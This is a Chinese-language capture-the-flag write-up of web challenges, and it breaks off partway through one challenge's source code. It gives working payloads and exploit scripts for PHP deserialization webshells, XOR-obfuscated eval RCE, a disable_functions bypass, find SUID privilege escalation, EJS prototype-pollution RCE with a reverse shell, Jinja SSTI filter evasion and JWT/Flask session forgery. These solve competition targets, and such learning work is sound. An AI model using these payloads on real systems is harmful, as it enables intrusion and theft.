- > 只记录非常规题
- # ctf_curl
  collapsed:: true
	- 这题不是命令执行绕过，直接用curl从服务器上面下webshell就好了
	- 题目
		- ```php
		  <?php
		  highlight_file('index.php');
		  // curl your domain
		  // flag is in /tmp/Syclover
		  
		  if (isset($_GET['addr'])) {
		      $address = $_GET['addr'];
		      if(!preg_match("/;|f|:|\||\&|!|>|<|`|\(|{|\?|\n|\r/i", $address)){
		          $result = system("curl ".$address."> /dev/null");
		      } else {
		          echo "Hacker!!!";
		      }
		  }
		  ?>
		  ```
	- payload: `/?addr=xxx.xx/a.txt+-o+a.php`
- # EzHttp
  collapsed:: true
	- 典型 [[CTF/HTML&HTTP]] 题
	- 代理的HTTP header: `Via: xxx.com`
- # klf_ssti
  collapsed:: true
	- 盲打SSTI
	- payload生成
		- ```python
		  payload, _ = fenjing.exec_cmd_payload(lambda x: True, reverse_shell_payload)
		  print(enc_dec.urlencode(payload))
		  ```
- # ez_remove
  collapsed:: true
	- 打带fast destruct的PHP反序列化，然后写webshell,再用蚁剑的bypass_disable_functions插件绕disable function实现打开根目录下的flag文件
	- 写马exp
		- ```python
		  payload = enc_dec.base64_decode("YToyOntpOjA7TzozOiJzeWMiOjE6e3M6NToibG92ZXIiO3M6NTI6ImVjaG8gMTE0NTE0OyBlY2hvICdpbWRlc3RydWN0JztldmFsKCRfUE9TVFsnZGF0YSddKTsiO31pOjE7aToxMTQ1MTQ7fQ==")
		  payload = payload.replace('s:5:"lover"', 'S:5:"\\6cover"')
		  payload = payload.replace('i:1;i:114514;', 'i:0;i:114514;')
		  print(payload)
		  print(enc_dec.urlencode(payload))
		  r = base_post(url, params = {
		      "web": payload
		  }, data = {
		      "data": "file_put_contents('a.php', '<?php eval($_POST[\"data\"]);?>');"
		  })
		  print("1145141919810" in r.text)
		  print(r.text)
		  ```
- # ez_path
  collapsed:: true
	- Yuntong扫描发现注释，注释说flag在`/f14444`
	  collapsed:: true
		- ```yaml
		  "CheckCommentsMod":
		  - |-
		    在页面 https://ry5zqrhwj9rlmytq1nh67jw7b.node.game.sycsec.com/ 找到以下注释：['<!--secret在根目录f14444文件里面，别忘记了-->', '<!-- 可以添加更多特色文章 -->']
		  - |-
		    在页面 https://ry5zqrhwj9rlmytq1nh67jw7b.node.game.sycsec.com 找到以下注释：['<!--secret在根目录f14444文件里面，别忘记了-->', '<!-- 可以添加更多特色文章 -->']
		  - |- 
		    在页面 https://ry5zqrhwj9rlmytq1nh67jw7b.node.game.sycsec.com/console 找到以下注释：["<!-- We need to make sure this has a favicon so that the debugger does\n         not accidentally trigger a request to /favicon.ico which might\n         change the application's state. -->"]
		  "CheckHTMLLinksMod":
		  - |-
		    找到新的目录：https://ry5zqrhwj9rlmytq1nh67jw7b.node.game.sycsec.com/
		  
		  ```
	- 题目给出了pyc文件，反编译得到源码
	  collapsed:: true
		- ```python
		  # uncompyle6 version 3.9.0
		  # Python bytecode version base 3.6 (3379)
		  # Decompiled from: Python 3.8.18 (default, Aug 28 2023, 00:00:00)
		  # [GCC 13.2.1 20230728 (Red Hat 13.2.1-1)]
		  # Embedded file name: ./tempdata/96e9aea5-79fb-4a2f-a6b9-d4f3bbf3c906.py
		  # Compiled at: 2023-08-26 01:33:29
		  # Size of source mod 2**32: 2076 bytes
		  import os, uuid
		  from flask import Flask, render_template, request, redirect
		  
		  app = Flask(__name__)
		  ARTICLES_FOLDER = "articles/"
		  articles = []
		  
		  
		  class Article:
		      def __init__(self, article_id, title, content):
		          self.article_id = article_id
		          self.title = title
		          self.content = content
		  
		  
		  def generate_article_id():
		      return str(uuid.uuid4())
		  
		  
		  @app.route("/")
		  def index():
		      return render_template("index.html", articles=articles)
		  
		  
		  @app.route("/upload", methods=["GET", "POST"])
		  def upload():
		      if request.method == "POST":
		          title = request.form["title"]
		          content = request.form["content"]
		          article_id = generate_article_id()
		          article = Article(article_id, title, content)
		          articles.append(article)
		          save_article(article_id, title, content)
		          return redirect("/")
		      else:
		          return render_template("upload.html")
		  
		  
		  @app.route("/article/<article_id>")
		  def article(article_id):
		      for article in articles:
		          if article.article_id == article_id:
		              title = article.title
		              sanitized_title = sanitize_filename(title)
		              article_path = os.path.join(ARTICLES_FOLDER, sanitized_title)
		              with open(article_path, "r") as (file):
		                  content = file.read()
		              return render_template(
		                  "articles.html",
		                  title=sanitized_title,
		                  content=content,
		                  article_path=article_path,
		              )
		  
		      return render_template("error.html")
		  
		  
		  def save_article(article_id, title, content):
		      sanitized_title = sanitize_filename(title)
		      article_path = ARTICLES_FOLDER + "/" + sanitized_title
		      with open(article_path, "w") as (file):
		          file.write(content)
		  
		  
		  def sanitize_filename(filename):
		      sensitive_chars = ["':'", "'*'", "'?'", "'\"'", "'<'", "'>'", "'|'", "'.'"]
		      for char in sensitive_chars:
		          filename = filename.replace(char, "_")
		  
		      return filename
		  
		  
		  if __name__ == "__main__":
		      app.run(debug=True)
		  # okay decompiling result.pyc
		  
		  ```
	- 分析源码
		- 有可控的文件读取，考虑任意文件读取
		- flask打开了debug, 考虑 [[CTF/Flask/Debug模式RCE]]
		- 保存和读取路径时对路径的处理有一点点区别
			- 保存时直接使用了字符串拼接
			- 读取时使用了`os.path.join`：[[CTF/Python/os.path.join]]
		- 应该是直接读flag
	- 读文件exp
		- ```python
		  path = "/f14444"
		  
		  r = base_post(url + "/upload", data = {
		      "title": path,
		      "content": '114'
		  }, allow_redirects = False)
		  print(r.status_code)
		  print(r.url)
		  
		  r = base_get(url + "/home")
		  bs = BeautifulSoup(r.text, "html.parser")
		  print(r.status_code)
		  # body > ul:nth-child(2) > li:nth-child(12)
		  uri = bs.select("body > ul:nth-child(2) > li > a")[-1].attrs["href"]
		  r = base_get(url + uri)
		  bs = BeautifulSoup(r.text, "html.parser")
		  # print(r.text)
		  content = str(bs.select("body p")[0])
		  print(content)
		  ```
- # you konw flask?
  collapsed:: true
	- robots.txt信息泄漏，看到`/3ysd8.html`，其中有注释：
		- ```text
		   key是  app.secret_key = 'wanbao'+base64.b64encode(str(random.randint(1, 100)).encode('utf-8')).decode('utf-8')+'wanbao' (www,我可爱的菀宝,我存的够安全的吧) 
		  ```
	- 生成字典
		- ```python
		  import base64
		  with open("words.txt", "w") as f:
		      for i in range(1, 101):
		          f.write('wanbao'+base64.b64encode(str(random.randint(1, 100)).encode('utf-8')).decode('utf-8')+'wanbao' + "\n")
		  ```
	- 使用flask unsign爆破
		- ```shell
		  flask-unsign -u -c 'eyJpc19hZG1pbiI6ZmFsc2UsIm5hbWUiOiIxMjMiLCJ1c2VyX2lkIjoyfQ.ZUz9nA.ebVoaXZinRo31CVTDEzfnRulGlg' -w words.txt
		  ```
	- 拿着爆破出来的key伪造admin身份
		- ```shell
		  flask-unsign -s -c "{'is_admin': True, 'name': '123', 'user_id': 2}" --secret 'wanbaoMzg=wanbao'
		  ```
	- 使用新的session cookie登陆即可
- # 雨
  id:: 654dda41-c3ee-4d76-b945-69080bd6539a
  collapsed:: true
	- jwt爆破
		- ```shell
		  ./jwtcrack 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJpYXQiOjE2OTk2MDA4NzB9.rZSOHjbuvwqWCVGlQfhnVlapU7CgPsRS58l1he4lDqY'
		  Secret is "VanZY"
		  
		  ```
	- 伪造jwt并查看`/source`拿到源码
	  collapsed:: true
		- ```js
		  const express = require('express');
		  const jwt = require('jsonwebtoken');
		  const app = express();
		  const bodyParser = require('body-parser')
		  const path = require('path');
		  const jwt_secret = "VanZY";
		  const cookieParser = require('cookie-parser');
		  const putil_merge = require("putil-merge")
		  app.set('views', './views');
		  app.set('view engine', 'ejs');
		  app.use(cookieParser());
		  app.use(bodyParser.urlencoded({extended: true})).use(bodyParser.json())
		  
		  var Super = {};
		  
		  var safecode = function (code){
		      let validInput = /global|mainModule|import|constructor|read|write|_load|exec|spawnSync|stdout|eval|stdout|Function|setInterval|setTimeout|var|\+|\*/ig;
		      return !validInput.test(code);
		  };
		  
		  app.all('/code', (req, res) => {
		    res.type('html');
		    if (req.method == "POST" && req.body) {
		      putil_merge({}, req.body, {deep:true});
		    }
		    res.send("welcome to code");
		  });
		  
		  app.all('/hint', (req, res) => {
		      res.type('html');
		      res.send("I heard that the challenge maker likes to use his own id as secret_key");
		  });
		  
		  app.get('/source', (req, res) => {
		    res.type('html');
		    var auth = req.cookies.auth;
		    jwt.verify(auth, jwt_secret , function(err, decoded) {
		      try{
		        if(decoded.user==='admin'){
		          res.sendFile(path.join(__dirname + '/index.js'));
		        }else{
		          res.send('you are not admin    <!--Maybe you can view /hint-->');
		        }
		      }
		      catch{
		        res.send("Fuck you Hacker!!!")
		      }
		    });
		  });
		  
		  app.all('/create', (req, res) => {
		    res.type('html');
		    if (!req.body.name || req.body.name === undefined || req.body.name === null){
		      res.send("please input name");
		    }else {
		      if (Super['userrole'] === 'Superadmin') {
		          res.render('index', req.body);
		        }else {
		          if (!safecode(req.body.name)) {
		              res.send("你在做什么？快停下！！！")
		          }
		          else{
		              res.render('index', {name: req.body.name});
		          }
		        }
		    }
		  });
		  
		  app.get('/',(req, res) => {
		      res.type('html');
		      var token = jwt.sign({'user':'guest'},jwt_secret,{ algorithm: 'HS256' });
		      res.cookie('auth ',token);
		      res.end('Only admin can get source in /source');
		  
		  });
		  
		  app.listen(3000, () => console.log('Server started on port 3000'));
		  ```
	- 分析源码
		- `/code`: [[CTF/JS/原型链污染]]
		- `/create`: [[CTF/JS/EJS的原型链污染]] RCE
	- 原型链污染
		- ```python
		  # url = "http://127.0.0.1:3000"
		  url = "https://dehxljmgktwjty8qtjwd0mlnh.node.game.sycsec.com"
		  
		  r = base_post(
		      url + "/code",
		      json={
		          "constructor": {
		              "prototype": {
		                  "userrole": "Superadmin"
		              }
		          }
		      }
		  )
		  print(r.text)
		  ```
	- EJS RCE
		- 控制`escape`
			- 需要让`client`为真
			- ```python
			  ejs_escape = """\
			  function escapeXMLToString114() {
			    return Function.prototype.toString.call(this) + ';\\n' + escapeFuncStr;
			  }
			  console.log('114514ejs');
			  process.mainModule.require('child_process').execSync(CMD);
			  \
			  """.replace("CMD", repr(reverse_shell_payload))
			  r = base_post(
			      url + "/create",
			      json={
			          "name": "global",
			          "settings": {
			              "view options": {
			                  "client": "1",
			                  "escape": ejs_escape,
			              }
			          }
			      },
			  )
			  print(r.text)
			  ```
- # EzRce
  collapsed:: true
	- 思路
		- 利用异或绕过WAF
		- 利用create_function实现eval RCE
		- 打`disable_functions`: [[CTF/PHP/绕过disable_function]]
	- 绕过WAF
		- fuzz出所有可用的字符，然后异或绕过
		- 自用模块
			- ```python
			  
			  def waf(s):
			      return all(c in valid_chars for c in s)
			  
			  
			  xor = encoder.XorStringPairFinder(init=ord("@"), filter_func = waf)
			  xor.find_str("}eval($_POST[data]);#")
			  # ('@@V@@vev,e%vv%@V@!v^|', '=% !,^A)|*v"-A!"!|_e_')
			  ```
		- 最后payload
			- ```python
			  payload = """
			  ('@$@@V@#@#@@V@@@'^'#V%!"%|&V.#")/.')('',('@@V@@vev,e%vv%@V@!v^|'^'=% !,^A)|*v"-A!"!|_e_'));
			  """.strip()
			  ```
	- RCE
		- ```python
		  # create_function('','}eval($_POST[data]);#')
		  payload = """
		  ('@$@@V@#@#@@V@@@'^'#V%!"%|&V.#")/.')('',('@@V@@vev,e%vv%@V@!v^|'^'=% !,^A)|*v"-A!"!|_e_'));
		  """.strip()
		  r = base_post(url, params = {
		      "data": payload
		  }, data = {
		      "data": "highlight_file('waf.php');"
		  })
		  with open("test.html", "w") as f:
		      f.write(r.text) 
		  print(r.url)
		  print(r.text)
		  ```
		- 蚁剑直连，密码data
			- ```
			  http://aqooq1tqahm40phupjgdpccls.node.game.sycsec.com/?data=%28%27%40%24%40%40V%40%23%40%23%40%40V%40%40%40%27%5E%27%23V%25%21%22%25%7C%26V.%23%22%29%2F.%27%29%28%27%27%2C%28%27%40%40V%40%40vev%2Ce%25vv%25%40V%40%21v%5E%7C%27%5E%27%3D%25+%21%2C%5EA%29%7C%2Av%22-A%21%22%21%7C_e_%27%29%29%3B
			  ```
	- disable_functions
		- 打iconv绕过，参考： ((64f02a3a-0eae-4d6c-8b73-8b34d2a17473))
		- 注意这里貌似有缓存机制，不会重新加载exp.so, 建议直接反弹shell
		- exp
			- ```python
			  gconv_content = encoder.base64_encode("""\
			  module  exp//    INTERNAL    /var/www/html/exp    2
			  module  INTERNAL   exp//    /var/www/html/exp    2
			  """)
			  
			  shell.exec("rm exp.so; gcc exp.c -o exp.so -shared -fPIC")
			  print(shell.exec("md5sum exp.so"))
			  with open("exp.so", "rb") as f:
			      b = encoder.base64_encode(f.read())
			  
			  eval_payload = """
			  var_dump('start');
			  @unlink('exp.so');
			  file_put_contents('exp.so', base64_decode('EXP_CONTENT'));
			  file_put_contents('gconv-modules', base64_decode('GCONV_CONTENT'));
			  echo md5_file('exp.so');
			  sleep(0.5);
			  putenv("GCONV_PATH=/var/www/html/");
			  iconv("exp", "UTF-8", "");
			  
			  $a=new DirectoryIterator("glob:///tmp/t*");
			  foreach($a as $f){
			  	echo $f.' ';
			  }
			  highlight_file('/tmp/t.txt');
			  var_dump('stop');
			  """.replace("EXP_CONTENT", b).replace("GCONV_CONTENT", gconv_content)
			  payload = """
			  ('@$@@V@#@#@@V@@@'^'#V%!"%|&V.#")/.')('',('@@V@@vev,e%vv%@V@!v^|'^'=% !,^A)|*v"-A!"!|_e_'));
			  """.strip()
			  r = base_post(url, params = {
			      "data": payload
			  }, data = {
			      "data": eval_payload
			  })
			  print(r.url)
			  print(r.text)
			  ```
	- 然后find提权
		- 寻找特殊权限的文件`find / -perm -u=s -type f 2>/dev/null`看到find
		- find提权方式：
			- ```shell
			  find . -exec whoami \; -quit
			  find . -exec sh -cp 'whoami' \; -quit
			  find . -exec sh -p \; -quit
			  ```
- # ezpython
  collapsed:: true
	- 参考
		- [[CTF/Python/Python的原型链污染]]
	- 思路
		- 用python原型链污染伪造`isvip`
		- 用unicode编码绕过waf
		- fuzz绕过奇葩的num参数
	- python的原型链污染（我更愿意叫“属性污染”）
		- 需要伪造其中的`isvip`来通过检测
			- ```python
			  class User:
			      def __init__(self):
			          self.username = ""
			          self.password = ""
			          self.isvip = False
			  
			  
			  class hhh(User):
			      def __init__(self):
			          self.username = ""
			          self.password = ""
			  ...
			          if user.isvip:
			  ```
		- python寻找对象属性的过程：
			- 查看类有没有此属性，有就返回
			- 查看各个父类有没有属性，有就返回
			- 查看对象本身有没有属性，有就返回
			- 都找不到则报错
		- 因为python寻找属性时类的优先级高于对象，我们可以通过污染类的属性来通过`if user.isvip:`的判断
		- 产生污染处
			- ```python
			  user = hhh()
			  merge(data, user)
			  ```
		- 污染的目标是一个新的hhh对象`user`，我们可以赋值`user.__class__.__base__.isvip = True`
		- 对应的payload
			- ```python
			  payload = {
			      "username": "1",
			      "password": "1",
			      "__class__": {
			          "__base__": {
			              "isvip": True
			          }
			      }
			  }
			  ```
	- unicode绕过waf
		- 将字符串替换为`\u00xx`的格式
		- 示例
			- ```python
			  payload = json.dumps(payload)
			  blacklist = ["__class__", "__base__", "isvip"]
			  for w in blacklist:
			      payload = payload.replace(w, encoder.full_urlencode(w, head="\\u00"))
			  ```
	- fuzz绕过奇葩的num参数
		- fuzz发现在数字后面加一个空格即可绕过
	- 完整exp
		- ```python
		  url = "https://bc2tyd2d1citpf1m9mhee91o4.node.game.sycsec.com"
		  
		  payload = {
		      "username": "1",
		      "password": "1",
		      "__class__": {
		          "__base__": {
		              "isvip": True
		          }
		      }
		  }
		  payload = json.dumps(payload)
		  blacklist = ["__class__", "__base__", "isvip"]
		  for w in blacklist:
		      payload = payload.replace(w, encoder.full_urlencode(w, head="\\u00"))
		  
		  r = base_post(url + "/register", data = payload, allow_redirects = False)
		  print(r.text)
		  r = base_post(url + "/login", data = {"username": "1", "password": "1"}, allow_redirects = False)
		  print(r.text)
		  r = base_get(url + "/flag", params = {
		      "num": "123456789 "
		  }, allow_redirects = False)
		  print(r.text)
		  ```
- # ez_php
  collapsed:: true
	- 解题思路
		- php常规题加大加厚，涉及知识点
			- [[CTF/PHP/反序列化]]
				- ((64f02a3a-fbd3-41a2-90dd-34399046a38a))
				- ((6478aaed-0cfc-41e3-a12e-55de79af3104))
			- [[CTF/MD5]]
			- [[CTF/PHP/运算优先级]]
			- [[CTF/PHP/可变函数]]
			- [[CTF/PHP/原生类]]
			- [[CTF/伪协议]]
			- ((64572c54-7814-4588-9fec-96dd86e3ab23))
		- 总体思路
			- 反序列化`useless`类读`key.php`，找到hername和key
			- 利用反序列化调用`her::find`，然后使用原生类+伪协议找到并读取flag
		- 绕过waf进行反序列化
			- 题目不允许反序列化开头是`O`或`a`的字符串
			- 把你的类塞进`ArrayObject`然后反序列化出来就是`C`开头的了
				- ```php
				  $a = new ArrayObject([114 => 514]);
				  $a -> o = $o; // 把你的类塞进这里
				  echo "payloadsta"."rt".base64_encode(serialize($a))."payloadst"."op";
				  ```
		- 读key.php
			- [[CTF/MD5]]绕过，然后利用 ((64572c54-7814-4588-9fec-96dd86e3ab23)) 绕过`if(basename($_SERVER[$a])==='key.php')`
			- 其中计算`$bool`时的and优先级小于赋值，所以and后面的那个奇怪的判断可以忽略，参考：[[CTF/PHP/运算优先级]]
		- 读flag
			- 链子：`Me::__wakeup --> her::__invoke --> important::__sleep --> useless::__get --> FLAG!`
			- `Me::__wakeup`
				- 一眼用 ((6478aaed-0cfc-41e3-a12e-55de79af3104)) 绕过
			- `useless::__get`
				- 用[[CTF/PHP/可变函数]]调用`her::find`
			- 原生类读flag
				- ctf: `DirectoryIterator`, fun: `glob://f*`: 看到flag文件
				- ctf: `SplFileObject`, fun: `php://filter/read=convert.base64-encode/resource=flag_my_baby.php`拿到flag文件的base64, 解密即可
	- 读key.php
		- pop链
			- ```php
			  $useless = new useless([]);
			  $useless -> QW = urldecode("%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2");
			  $useless -> YXX = urldecode("%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2");
			  
			  $o = $useless;
			  $a = new ArrayObject([114 => 514]);
			  $a -> o = $o;
			  
			  echo "payloadsta"."rt".base64_encode(serialize($a))."payloadst"."op";
			  
			  ```
		- 读到一个jpg的base64，解码
			- ![](./assets/geekchallenge2023.jpg)
	- 读flag
		- pop
			- ```php
			  $her_find = new her("momo", 9);
			  $useless = new useless([
			    "seeyou" => [$her_find, "find"]
			  ]);
			  
			  $important = new important();
			  $important -> power = $useless;
			  
			  $her = new her("momo", 9);
			  $her -> asd = $important;
			  
			  
			  $me = new Me();
			  $me -> bro = & $me -> secret;
			  $me -> qwe = $her;
			  
			  $o = $me;
			  $a = new ArrayObject([114 => 514]);
			  $a -> o = $o;
			  echo "payloadsta"."rt".base64_encode(serialize($a))."payloadst"."op";
			  ```
		- 然后用原生类配合伪协议读文件
			- ```python
			  r = base_post(url, params = {
			      "user": get_payload_fcall(),
			      "file": "data://text/plain,loveyou",
			      # "fun": "glob://f*"
			      "fun": "php://filter/read=convert.base64-encode/resource=flag_my_baby.php"
			  }, data = {
			      # "ctf":"DirectoryIterator",
			      "ctf":"SplFileObject",
			  })
			  print(r.text.replace("<br>", "<br>\n"))
			  ```
	- exp
		- pop.php
		  collapsed:: true
			- ```php
			  <?php
			  header("Content-type:text/html;charset=utf-8"); 
			  error_reporting(0);
			  show_source(__FILE__);
			  include('key.php');
			  include('waf.php');
			  
			  class Me {
			      public $qwe;
			      public $bro;
			      public $secret;
			  
			      public function __wakeup() {
			          echo("进来啦<br>");
			          $characters = 'abcdefghijklmnopqrstuvwxyz0123456789';
			          $randomString = substr(str_shuffle($characters), 0, 6);
			          $this->secret=$randomString;
			  
			          if($this->bro===$this->secret){
			          $bb = $this->qwe;        
			          return $bb();
			          }
			          
			          else{
			              echo("错了哥们,再试试吧<br>");
			          }
			      }
			  
			  }
			  
			  class her{
			      private $hername;
			      private $key;
			      public $asd;
			      public function __construct($hername,$key){
			          $this -> hername=$hername;
			          $this -> key=$key;
			      }
			      public function __invoke() {
			          echo("好累，好想睡一觉啊<br>");
			          serialize($this->asd);
			      }
			  
			      public function find() {
			          echo("你能找到加密用的key和她的名字吗？qwq<br>");
			          if (encode($this->hername,$this->key) === 'vxvx') {
			              echo("解密成功！<br>");
			              $file=$_GET['file'];
			  
			              if (isset($file) && (file_get_contents($file,'r') === "loveyou"))
			              {
			                  echo("快点的，急急急！！！<br>");
			                  echo new $_POST['ctf']($_GET['fun']);
			              }
			              else{
			                  echo("真的只差一步了！<br>");
			              }
			          }
			          else{
			              echo("兄弟怎么搞的？<br>");
			          }
			      }
			  }
			  
			  class important{
			      public $power;
			  
			      // public function __sleep() {
			      //     echo("睡饱了，接着找！<br>");
			      //     return $this->power->seeyou;
			      // }
			  }
			  
			  class useless {
			      private $seeyou;
			      public $QW;
			      public $YXX;
			  
			      public function __construct($seeyou) {
			          $this->seeyou = $seeyou;
			      }
			  
			      public function __destruct() {
			          $characters = '0123456789';
			          $random = substr(str_shuffle($characters), 0, 6);
			  
			          if (!preg_match('/key\.php\/*$/i', $_SERVER['REQUEST_URI'])){
			              if((strlen($this->QW))<80 && strlen($this->YXX)<80){
			                  $bool=!is_array($this->QW)&&!is_array($this->YXX)&&(md5($this->QW) === md5($this->YXX)) && ($this->QW != $this->YXX) and $random==='newbee';
			                  if($bool){
			                  echo("快拿到我的小秘密了<br>");
			                      $a = isset($_GET['a'])? $_GET['a']: "" ;
			  
			                      if(!preg_match('/HTTP/i', $a)){
			                          echo (basename($_SERVER[$a]));
			                          echo ('<br>');
			  
			                          if(basename($_SERVER[$a])==='key.php'){
			                              echo("找到了！但好像不能直接使用，怎么办，我好想她<br>");
			                              $file = "key.php";
			                              readfile($file);
			                          }
			                      }
			                      else{
			                          echo("你别这样，她会生气的┭┮﹏┭┮");
			                      }
			                  }
			              }
			              else{
			                  echo("就这点能耐？怎么帮我找到她(╥╯^╰╥)<br>");
			              }
			          }
			      }
			      public function __get($good) {
			          echo "you are good,你快找到我爱的那个她了<br>";
			          $zhui = $this->$good;  
			          $zhui[$good]();  
			      }
			  }
			  
			  // Me::__wakeup --> her::__invoke --> important::__sleep --> useless::__get --> FLAG!
			  if($_GET["action"] == "fcall") {
			      $her_find = new her("momo", 9);
			      $useless = new useless([
			          "seeyou" => [$her_find, "find"]
			      ]);
			      
			      $important = new important();
			      $important -> power = $useless;
			      
			      $her = new her("momo", 9);
			      $her -> asd = $important;
			      
			  
			      $me = new Me();
			      $me -> bro = & $me -> secret;
			      $me -> qwe = $her;
			      
			      $o = $me;
			      $a = new ArrayObject([114 => 514]);
			      $a -> o = $o;
			      echo "payloadsta"."rt".base64_encode(serialize($a))."payloadst"."op";
			  }
			  else if($_GET["action"] == "getkey") {
			      $useless = new useless([]);
			      $useless -> QW = urldecode("%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2");
			      $useless -> YXX = urldecode("%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2");
			      
			      $o = $useless;
			      $a = new ArrayObject([114 => 514]);
			      $a -> o = $o;
			      
			      echo "payloadsta"."rt".base64_encode(serialize($a))."payloadst"."op";
			  }
			  ```
		- python脚本
		  collapsed:: true
			- ```python
			  # url = "http://127.0.0.1:8080/index.php"
			  url = "https://rtmnchid56vovnhz77v4mffy6.node.game.sycsec.com/havefun.php"
			  api_url = "http://127.0.0.1:8080/pop.php"
			  
			  def get_payload_fcall():
			      r = base_get(api_url, params = {"action": "fcall"})
			      print(r.text)
			      content = r.text.rpartition("payloadstart")[2].partition("payloadstop")[0]
			      return encoder.base64_decode(content)
			  
			  def get_payload_getkey():
			      r = base_get(api_url, params = {"action": "getkey"})
			      content = r.text.rpartition("payloadstart")[2].partition("payloadstop")[0]
			      print(content)
			      return encoder.base64.b64decode(content)
			  
			  def get_keyphp_content():
			      r = base_get(url + "/key.php/%80", params = {
			          "user": get_payload_getkey(),
			          "a": "PATH_INFO"
			      })
			      with open("phpinfo.html", "w") as f:
			          f.write(r.text)
			      return r.text.rpartition("我好想她<br>")[2]
			  
			  # with open("key.php", "w") as f:
			  #     f.write(get_keyphp_content())
			  
			  r = base_post(url, params = {
			      "user": get_payload_fcall(),
			      "file": "data://text/plain,loveyou",
			      # "fun": "glob://f*"
			      "fun": "php://filter/read=convert.base64-encode/resource=flag_my_baby.php"
			  }, data = {
			      # "ctf":"DirectoryIterator",
			      "ctf":"SplFileObject",
			  })
			  print(r.text.replace("<br>", "<br>\n"))
			  ```
- # klf_2
  collapsed:: true
	- [[CTF/SSTI/Jinja]]
	- 大概是针对焚靖出的题目，焚靖的常用规则都被禁了
		- 首先焚靖高度依赖的`%`被针对了，然后几乎所有高端的生成字符串规则也全都被针对了
		- 甚至连数字`37`都没办法自动生成...
		- 而且尝试手动注入会发现这一句话：`好好好你不是klf，我一定会再回来的!`...
	- 绕过思路
		- 将字符串分成一个个字符分别生成，然后用`join` filter合并起来
		- 字符可以用`(lipsum|trim|list|batch(INDEX)|first|last)`这样的payload生成
		- 然后就可以拿到chr函数了，就可以生成任意字符串，实现RCE了
		- 也可以通过生成`{:c}`并通过format生成百分号，然后和`c`拼在一起变成`%c`，就可以通过format生成任意字符了
		- 自动化思路：[[CTF/WP/klf_2的SSTI自动化绕过]]
	- 给焚靖加上了新的规则，它生成的payload长这样：
		- ```
		  {%set prrc=((dict(dict(dict(a=1)|tojson|batch(2))|batch(2))|join,(dict(c=x)|join),dict()|trim|last)|join).format(((19,18,)|sum))%}{{(((((((lipsum|attr(((((x,x,x,x,x,x,x,x,x,x,x,x,)|join(((prrc,(dict(c=x)|join))|join))))%(95,95,((39,39,25,)|sum),((35,35,35,3,)|sum),111,98,97,((35,35,35,3,)|sum),115,95,95))))|attr(((((x,x,x,x,x,x,x,x,x,x,x,x,)|join(((prrc,(dict(c=x)|join))|join))))%(95,95,((39,39,25,)|sum),((39,39,23,)|sum),116,((39,39,27,)|sum),116,((39,39,23,)|sum),((39,39,31,)|sum),95,95))))(((((x,x,x,x,x,x,x,x,x,x,x,x,x,)|join(((prrc,(dict(c=x)|join))|join))))%(95,95,98,117,((39,39,27,)|sum),((35,35,35,3,)|sum),116,((39,39,27,)|sum),((39,39,32,)|sum),115,95,95)))|attr(((((x,x,x,x,x,x,x,x,x,x,x,x,)|join(((prrc,(dict(c=x)|join))|join))))%(95,95,((39,39,25,)|sum),((39,39,23,)|sum),116,((39,39,27,)|sum),116,((39,39,23,)|sum),((39,39,31,)|sum),95,95))))(((((x,x,x,x,x,x,x,x,x,x,x,)|join(((prrc,(dict(c=x)|join))|join))))%(95,95,((39,39,27,)|sum),((39,39,31,)|sum),112,111,114,116,95,95)))((dict(o=x,s=x)|join))|attr(((((x,x,x,x,x,x,)|join(((prrc,(dict(c=x)|join))|join))))%(112,111,112,((39,39,23,)|sum),((39,39,32,)|sum)))))(((((x,x,x,x,x,)|join(((prrc,(dict(c=x)|join))|join))))%(((35,35,35,3,)|sum),115,32,((39,8,)|sum)))))|attr((dict(rea=x,d=x)|join)))())}}
		  ```
	- 做完发现blacklist长这样：
		- ```python
		  bl = ['_', '\\', '\'', '"', 'request', "+", 'class', 'init', 'arg', 'config', 'app', 'self', 'cd', 'chr',
		        'request', 'url', 'builtins', 'globals', 'base', 'pop', 'import', 'popen', 'getitem', 'subclasses', '/',
		        'flashed', 'os', 'open', 'read', 'count', '*', '38', '124', '47', '59', '99', '100', 'cat', '~',
		        ':', 'not', '0', '-', 'ord', '37', '94', '96', '[',']','index','length']#'43', '45',
		  ```
		- 里面有一堆两位数，加减乘除，url和冒号，还有`length`和`count`
		- 甚至后面还有注释掉的两位数，绝对是被针对了。。。
	- 焚靖v0.5.10会在比赛后发布，应该是可以秒掉这一题
- # klf_3
  collapsed:: true
	- 新版焚靖直接RCE的
	- 分析了一下WAF, 自动化思路：[[CTF/WP/klf_3的SSTI自动化绕过]]
	  collapsed:: true
	- 源码：
	  collapsed:: true
		- ```python
		  from flask import Flask, request, render_template, render_template_string,send_from_directory
		  import re
		  import os
		  
		  app = Flask(__name__)
		  
		  @app.route('/', methods=['GET', 'POST'])
		  def index():
		      return render_template('index.html')
		  
		  @app.route('/secr3ttt', methods=['GET', 'POST'])
		  def secr3t():
		  
		      name = request.args.get('klf', '')
		      template = f'''
		         <html>
		             <body>
		                 <h1>找到secr3t了，但是找不到flag你还是个klf</h1>
		                 <h1>%s</h1>         
		             </body>
		         </html>
		         <img src=\"https://image-obsidian-1317327960.cos.ap-chengdu.myqcloud.com/obisidian-blog/8.jpg\" alt="g">
		         <!--klf?-->
		         <!-- klf还想要flag？没那么容易 -->
